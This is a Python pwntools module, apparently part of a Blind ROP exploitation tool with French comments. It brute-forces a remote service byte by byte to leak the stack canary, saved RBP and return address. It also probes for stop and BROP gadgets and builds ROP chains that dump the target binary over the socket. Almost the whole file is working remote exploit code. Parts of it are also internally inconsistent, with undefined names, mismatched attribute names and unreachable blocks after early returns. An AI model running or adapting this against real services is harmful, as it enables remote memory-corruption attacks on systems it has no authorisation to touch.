#!/usr/bin/python3

from pwn import *
import sys

from print_tools import cred, cver, cend

# SYNTAX COLOURS AND SYSTEM DATA:

dodo    = 0.06


##### Leaking values #####--------------------------------------------------------------------------

def leakValues(ExploitStructure):

    TMP         = ExploitStructure
    LEAKEDINFO  = []

    tabstr  = ['CANARY     ', 'RBP        ', 'RETADR     ']
    indice  = 0

    while len(LEAKEDINFO) < 3:

        PAYLTMP = TMP.BUFFER
        for VALUE in LEAKEDINFO:
            PAYLTMP += VALUE

        LEAKVAL = b''
        OA = 0

        # En cas de presence de \x0A dans la valeur leakee
        #LEAKVAL = b'\x0a\xf2\x45'
        #LEAKVAL = LEAKVAL[::-1]
        ##################################################

        while len(LEAKVAL) < 8:

            for i in range(256):        # 256 hein

                r = TMP.remoteConnect()

                junk        = r.recv()      # "Enter"

                CHAR        = bytes([i])
                payload     = PAYLTMP + LEAKVAL + CHAR


                if OA == 3:                     # Il arrive parfois que l'un des chars soit un 0xA
                    LEAKVAL += bytes([0xA])     # Si jamais c'est le cas, apres 5 tentatives et 5 rejets
                    r.close()                   # le script attribuera 0xA a l'octet en cours de leak
                    OA = 0
                    break

                if i == 10:     # 10 == 0xA --> soit un saut de ligne, et ici ca fait planter le leak car
                    r.close()   # le service stoppe la lecture et retourne donc un Bye! vu qu'il n'y a
                    continue    # pas de segfault
                     

                r.send(payload)
                sleep(dodo)

                resp    = r.recv()
                NUM     = len(LEAKEDINFO) + 1

                print(CPUR + '[-] Leaked value (#{}) : 0x'.format(NUM) + CHAR.hex() + (LEAKVAL[::-1].hex()) + CEND, end='\r')

                ### Propre au binaire attaque (a optimiser)
                '''
                if NUM == 2 or NUM == 3 and len(LEAKVAL) == 5:
                    begin   = b'\x00\x00\x7f' 
                    LEAKVAL += begin[::-1]
                    break
                '''
                #############################

                if b'Bye' in resp:
                    LEAKVAL += CHAR
                    r.close()
                    break

                ##### Court-circuitage du leak en cas de besoin #####
                #if NUM == 1:
                #   LEAKVAL  = TMP.CANARY
                #   r.close()
                #   break
                #elif NUM == 2:
                #   LEAKVAL = TMP.RBP
                #   r.close()
                #   break

                #LEAKVAL = b'AAAAAAAA' # a dégager pour exploit ^

                #####################################################


                try:
                    r.close()
                except:
                    pass


                if(i==255):
                    print(CJAU + "[-] i raised to 255..." + CEND)
                    OA += 1
                    break

        # virer cette ligne pour ne pas appeler persoPrint dans ce module
        brop.crPrint(tabstr[indice], LEAKVAL, 0)
        LEAKEDINFO.append(LEAKVAL)

        if len(LEAKEDINFO)      == 1:
            TMP.CANARY = LEAKVAL
        elif len(LEAKEDINFO)    == 2:
            TMP.RBP = LEAKVAL
        if len(LEAKEDINFO)      == 3:
            TMP.RETADR = LEAKVAL

        indice += 1
        
    return(TMP)

##########################--------------------------------------------------------------------------

##### stop gadget #####-----------------------------------------------------------------------------

def get_stop_gadget(ExploitStructure):      # Recuperation d'un stop gadget et de l'adresse de base du binaire

    tmpbase = 0xFFFFFFFFFFFFF000 & u64(ExploitStructure.retadr) # Il ne s'agit pas forcement de la vrai base du binaire
                                                    # mais ça fait le taff pour calculer les offsets
    stopoffset = 0x221
    return p64(tmpbase + stopoffset)

    # v v v v v  PARTIE INUTILE UNE FOIS L'OFFSET DU stopgadget DETERMINE  v v v v v

    begin   = TMP.beginning()
    START   = tmpbase

    for i in range(START,START+0x1000): # A MODIFIER A LA MAIN EVENTUELLEMENT

        r = TMP.remoteConnect()

        junk        = r.recv()      # "Enter your choice"

        payload     = begin + p64(i)

        print(CPUR + "[-] Tested stop gadget address : " + hex(i) + CEND, end='\r')

        r.send(payload)
        sleep(dodo)

        resp    = r.recv()

        if b'Enter' in resp:
            print(CVER + "[+] Potential stop gadget located at : " + hex(i) + CEND)
            OFFSET  = i - tmpbase
            print(CVER + "[+] Offset from Pseudo Base could be : " + hex(OFFSET) + CEND)
            print(CJAU + "[!] --> Update getstopgadget() function !" + CEND)
            r.close()
            return p64(i)
        sleep(dodo)

        try:
            r.close()
        except:
            pass

#######################-----------------------------------------------------------------------------

##### brop gadget #####----------------------------------------------------------------------------- 

def get_brop_gadget(ExploitStructure):

    tmpbase = 0xFFFFFFFFFFFFF000 & u64(ExploitStructure.retadr) # Il ne s'agit pas forcement de la vrai base du binaire
                                                    # mais ça fait le taff pour calculer les offsets
    bropoffset = 0x69A
    return p64(tmpbase + bropoffset)

    # v v v v v  PARTIE INUTILE UNE FOIS L'OFFSET DU stopgadget DETERMINE  v v v v v

    begin       = TMP.beginning()
    START       = tmpbase
    trap_gadget  = TMP.crash

    for i in range(START, START+0x2000):

        r = TMP.remoteConnect()

        junk        = r.recv()      # "Enter your choice"

        payload     = begin + p64(i) + trap_gadget*6 + TMP.stopgadget + trap_gadget*6

        print(CPUR + '[-] Tested brop gadget address : ' + hex(i) + CEND, end='\r')

        r.send(payload)
        sleep(dodo)

        #--------------------
        resp    = r.recv()
        if b'Enter' in resp:
            print(CJAU + "[+] Potential brop gadget located at : " + hex(i) + CEND)

            r.close()

            r = TMP.remoteConnect()
            junk    = r.recv()

            payload = begin + p64(i+7) + trap_gadget*2 + TMP.stopgadget

            r.send(payload)
            sleep(dodo)
            
            resp = r.recv()
            if b'Enter' in resp:
                print(CVER + "[+] brop gadget located at : " + hex(i) + CEND)

                OFFSET      = i - tmpbase
                print(CVER + "[+] Offset from Pseudo Base could be : " + hex(OFFSET) + CEND)
                print(CJAU + "[!] --> Update getstopgadget() function !" + CEND)
                return(p64(i))

            sleep(0.03)
        #--------------------

        try:
            r.close()
        except:
            pass

#####



#######################-----------------------------------------------------------------------------

##### Fonction d'Arbitrary Read #####---------------------------------------------------------------

def get_leak_function(ExploitStructure):    # Recupere une fonction de leak, donc permetant un arbitrary read ; en gros, permet de leak le binaire

    binbase     = 0xFFFFFFFFFFFFF000 & u64(ExploitStructure.retadr) - 0x1000
    leakoffset  = 0x1000
    return p64(binbase + leakoffset), p64(binbase)

    # v v v v v  PARTIE INUTILE UNE FOIS L'OFFSET DE LA leakadr DETERMINE  v v v v v

    begin   = TMP.beginning()

    brop7   = p64(u64(TMP.bropgadget) + 0x7)
    brop9   = p64(u64(TMP.bropgadget) + 0x9)
    r15     = b'junkjunk'

    binbase = 0xFFFFFFFFFFFFF000 & u64(TMP.RETADR) - 0x1000 # Deja decrementee pour gagner du temps ^^
            #       # RSI

    LEN     = 0x10  # RDX
    SOCKET  = 0x4   # RDI
    
    while True:

        for i in range(binbase+0x200, binbase+0x2000):      # A MODIFIER A LA MAIN EVENTUELLEMENT

            r = TMP.remoteConnect()

            #junk       = r.recv()      # "Enter your choice"
            
            ropchain    = brop7 + p64(binbase) + r15 + brop9 + p64(SOCKET) + p64(i)
            payload     = begin + ropchain
            # ATTENTION : RDX n'est pas peuplé, et le brop9 fonctionne mal - parait-il -

            print(CPUR + '[-] Tested Leaking address : ' + hex(i) + CEND, end='\r')

            r.send(payload)
            sleep(dodo)

            #--------------------
            resp    = r.recv()

            if b'ELF' in resp:
                OFFSET  = i - binbase
                print(CVER + "[+] Leaking function found, offset from Base Address could be : " + hex(OFFSET) + CEND)
                print(CJAU + "[!] --> Update getLeakAdr() function !" + CEND)
                r.close()
                return p64(i), p64(binbase)

            try:
                r.close()
            except:
                pass
        
        binbase -= 0x1000       # Si pas de resultat, alors on decremente la binbase calculee

#####################################---------------------------------------------------------------

##### Test des gadgets #####------------------------------------------------------------------------

def test_gadget(ExploitStructure, gadget):

    begin   = ExploitStructure.beginning()

    r    = ExploitStructure.remoteConnect()
    junk = r.recv()

    #---------------------------------------------------------------------------
    if gadget   == 'stop_gadget':
        payload     = begin + ExploitStructure.stop_gadget

    elif gadget == 'brop_gadget':
        trap_gadget  = ExploitStructure.crash
        payload     = begin + ExploitStructure.brop_gadget + trap_gadget*6 + ExploitStructure.stop_gadget + trap_gadget*6

    elif gadget == 'leak_adr':
        targetadr   = ExploitStructure.bin_base

        brop7       = p64(u64(ExploitStructure.brop_gadget) + 0x7)
        brop9       = p64(u64(ExploitStructure.brop_gadget) + 0x9)
        r15         = b'junkjunk'

        len     = 0x10  # RDX
        socket  = 0x4   # RDI
        
        ropchain    = brop7 + targetadr + r15 + brop9 + p64(socket) + ExploitStructure.leak_adr
        payload     = begin + ropchain
    #---------------------------------------------------------------------------

    r.send(payload)
    sleep(dodo)
    resp    = r.recv()

    #---------------------------------------------------------------------------
    if b'Enter' in resp and gadget == 'bropgadget':

        r.close()
        brop7       = p64(u64(ExploitStructure.bropgadget) + 0x7)

        r       = ExploitStructure.remoteConnect()
        junk    = r.recv()

        payload     = begin + brop7 + trap*2 + ExploitStructure.stopgadget

        r.send(payload)
        sleep(dodo)
            
        resp = r.recv()
        if b'Enter' in resp:
            print(cver + " ---> is OK" + cend)
            r.close()
            return
        else:
            print(cred + " ---> [!] is wrong (second test fail)" + cend)
            r.close()
            return


    elif b'Enter' in resp and gadget == 'stopgadget':
        print(cver + " ---> is OK" + cend)
        r.close()
        return

    elif b'Enter' not in resp and gadget == 'bropgadget':
        print(cver + " ---> [!] is wrong (first test fail)" + cend)
        r.close()
        return

    elif b'ELF' in resp:
        print(cver + " ---> is OK" + cend)
        r.close()
        return

    else:
        print(cred + " ---> [!] is wrong" + cend)
        r.close()
        return




def checkBuildID(BUILDID):
#   TMP = ExploitStructure

    if len(BUILDID) == 40:

        if (re.findall(r"([a-fA-F\d]{40})", BUILDID)):
            print(CVER + "[+] BuildID    :  " + BUILDID + CEND)
            return 1
        #else:
        #   print(CRED + "[!] Error with given BuildID    : " + TMP.BUILDID + CEND)
    else:
        print(CRED + "[!] Error with given BuildID    : " + BUILDID + CEND)
        """
        vori si je demande quoi faire genre en remettre un, par exemple :
            ANOTHER = input(CJAU + "[?] Use specific BuildID ? (y / n) " + CEND)
            if ANOTHER == 'n':
                return 0
            elif ANOTHER == 'y':
                BUILDID = (input(CJAU + "[:] Put the other BuildID > " + CEND)).strip('\x0A')
            mais dans ce cas faut passer ee en parametre
                return 1
        """
        return 0